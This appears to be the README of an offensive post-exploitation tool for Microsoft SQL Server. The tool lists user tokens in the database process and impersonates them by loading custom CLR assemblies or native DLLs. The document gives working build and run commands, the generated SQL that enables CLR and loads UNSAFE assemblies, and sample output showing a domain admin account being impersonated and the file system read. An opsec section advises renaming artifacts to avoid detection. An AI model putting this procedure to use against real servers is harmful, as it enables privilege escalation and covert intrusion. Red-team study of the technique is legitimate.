## Summary
This tool allows to list and use user tokens present in the memory of the MSSQL process. Through it, it is possible to impersonate other users to achieve a security context switch, with the only requirement of having the ability to load assemblies to the database. The characteristics of the tokens available in memory depend on how the user has logged in to the database.

## Usage

Before using the python script to perform an action, you need to compile the assemblies needed for that specific action, as they are not hardcoded into the python script. For this, the provided build.ps1 script can be used. You can also change the compiler path to use the version of c# that you want. 

### List available tokens

This options allows to inspect the token handles available in the process' memory. This gives the oportunity to decide whether or not continue with the post explotation activities in case that no interesting tokens are found.

We use the build.ps1 to compile the token listing assembly.

```
$ .\build.ps1 -option list
[+] Compiling listing assembly...
Microsoft (R) Visual C# Compiler version 4.8.9037.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Now we can use the python script with the listing option.

```
$ python3 hansql.py x:y@z.z.z.z -l

<SNIP>

[SQL] > CREATE FUNCTION [dbo].KmUhuGWW() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME PcZPSEFX.program.run
[SQL] > SELECT dbo.KmUhuGWW()

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
nt service\mssqlserver* (+) -> 212 || macfi\iabad.adm* -> 1056    <-- Two tokens available for impersonation

<SNIP>
```

This output is explained as follows:
* There are two available tokens to impersonate.
* The token corresponding to the account ```nt service\mssqlserver``` has the id 212 while the token that belongs to the account ```macfi\iabad.adm``` has de id 1056. This id will be used during impersonation to select the right token.
* A ```*``` symbol means that the token can be used to access network resources  on behalf of the impersonated account.
* A ```(+)``` string means that the token has high integrity.

### Impersonate and run assembly

This option allows you to load and execute any assembly impersonating the security context of one of the tokens available in the process' memory. The provided assembly must comply with the following requirements:

* It must have a ```public static``` class called ```program```. Inside that class, at least two functions must be available: ```Do``` and ```run```.
* The ```Do``` function is a dummy function that performs no action. It is required in order to properly load the assembly on the database.
* The ```run``` function contains the main logic that will be called after impersonating the selected user token.
* The provided powershell script compiles `managed/testdll.cs` which can be used as a template. The resulting DLL will be located in `managed/rnumbers.dll`.

First we compile the assemblies.

```
$ .\build.ps1 -option managed
[+] Compiling impersonating assembly and managed DLL assembly...
Microsoft (R) Visual C# Compiler version 4.8.9037.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

Microsoft (R) Visual C# Compiler version 4.8.9037.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Then we can use the python script.

```
$ python3 hansql.py x:y@z.z.z.z -dll managed/r1191197344.dll

<SNIP>

[SQL] > CREATE FUNCTION [dbo].qdvtTjNG(@h NVARCHAR(MAX), @n NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME KvDSrslY.program.run
[SQL] > SELECT dbo.qdvtTjNG('w','')
----------------------   
NT Service\MSSQLSERVER   

[SQL] > SELECT dbo.qdvtTjNG('l','')
-----------------------------------------------------------------------------------------------------------------------------------------------------------------   
nt service\mssqlserver* (+) -> 212 || macfi\iabad.adm* -> 1056  

[-->] Supply valid token id to impersonate or supply any other thing to exit: 1056
[SQL] > SELECT dbo.qdvtTjNG('1056', 'r1191197344');                                                                                                                                                                                                                       
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
[+] Impersonated!
[!] Assembly loaded, now executing:

[+] Accessing C:\ from loaded assembly!
C:\$Recycle.Bin
C:\Config.Msi
C:\Documents and Settings
C:\PerfLogs
C:\Program Files

<SNIP>
```

### Impersonate and run unmanaged DLL

This option allows you to load and execute any native DLL impersonating the security context of one of the tokens available in the process' memory. The provided DLL must comply with the following requirement:

* It must contain an exported function called  ```Run```. This function will implement all the logic to be executed after impersonating the selected user token.

To manually map native DLLs this tool uses https://github.com/schellingb/DLLFromMemory-net.

A template for the native DLL is provided in `unmanaged/testdll/testdll.sln project`.

As always we begin by performing the necessary assembly compilations according to our option.

```
$ .\build.ps1 -option unmanaged
[+] Compiling unmanaged DLL loader assembly and unmanaged DLL loader + impersonating assembly...
Microsoft (R) Visual C# Compiler version 4.8.9037.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

Microsoft (R) Visual C# Compiler version 4.8.9037.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240


Capacity MaxCapacity Length
-------- ----------- ------
     216  2147483647    152
   53824  2147483647  48616
```
Then we can compile the unmanaged DLL `unmanaged/testdll/testdll.sln` using Visual Studio.

Finally we use the python script. In order to explicit the use of an unmanaged DLL, the script must be called with the flag ```-um```/```--unmanaged```.

```
$ python3 hansql.py x:y@z.z.z.z -dll unmanaged/testdll/x64/Release/testdll.dll -um

<SNIP>

[SQL] > CREATE FUNCTION [dbo].FQKegZnK(@us NVARCHAR(MAX), @d NVARCHAR(MAX)) RETURNS NVARCHAR(MAX) AS EXTERNAL NAME fLgtsTjZ.program.run
[SQL] > SELECT dbo.FQKegZnK('w','')
----------------------   
NT Service\MSSQLSERVER   

[SQL] > SELECT dbo.FQKegZnK('l','')
-----------------------------------------------------------------------------------------------------------------------------------------------------------------   
nt service\mssqlserver* (+) -> 212 || macfi\iabad.adm* -> 1056 

[-->] Supply valid token id to impersonate or supply any other thing to exit: 1056
[SQL] > SELECT dbo.FQKegZnK('1056','TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA....')
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
[+] Impersonated!
[!] Native DLL loaded, now executing:

[+] Accessing c:\ from native DLL!
c:\$Recycle.Bin
c:\Config.Msi
c:\Documents and Settings
c:\pagefile.sys

<SNIP>
```

## Manual execution
The powershell script is also designed to facilitate manual execution of the technique in case that the ```hansql.py``` can't be used. The purpouse of this option is to automate the generation of the several SQL commands required to manually execute the actions performed by ```hansql.py```, which can then be directly run on the database itself. 

```
$ Get-Help .\build.ps1

NAME
    C:\Pentest\investigations\sql\Handly-main\MSSQL\build.ps1

SINOPSIS
    .\build.ps1 -option list [-show]
    .\build.ps1 -option whoami [-show]
    .\build.ps1 -option managed [-show]
    .\build.ps1 -option ummanaged [-show]


SINTAXIS
    C:\Pentest\investigations\sql\Handly-main\MSSQL\build.ps1 [-Option] <String> [-Show] [<CommonParameters>]


DESCRIPTION
    This script compiles the neccesary assemblies used in the hansql.py script. It can also output the SQL commands to manually load the assemblies inline
    and perform the desired actions according to the given option.

<SNIP>	
```	

Here is an example:

```	
$ .\build.ps1 -option list -show
[+] Compiling listing assembly...
Microsoft (R) Visual C# Compiler version 4.8.9037.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

use msdb
GO

sp_configure 'show advanced options',1
RECONFIGURE
GO

sp_configure 'clr enabled',1
RECONFIGURE
GO

CREATE ASSEMBLY [SBzjuTwx] AUTHORIZATION [dbo] FROM
0x4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000000000000...
WITH PERMISSION_SET = UNSAFE
GO

CREATE FUNCTION [dbo].DjrqPHZh() RETURNS NVARCHAR(MAX) AS EXTERNAL NAME SBzjuTwx.program.run;
GO

<SNIP>	
```	

## Opsec considerations
Both the powershell and python scripts use several assembly, function and class names that are randomized every time the tool is launched. These names could look supicious upon inspection and it is up to the user to modify them to more benign looking names if needed. 

Also the name in disk of the assembly to be reflectively loaded after impersonation (`managed/rrandomnumbers.dll` in case you use build.ps1) ends up in the MSSQL assembly table, so again, you can compile it yourself to a less suspiciously looking name.
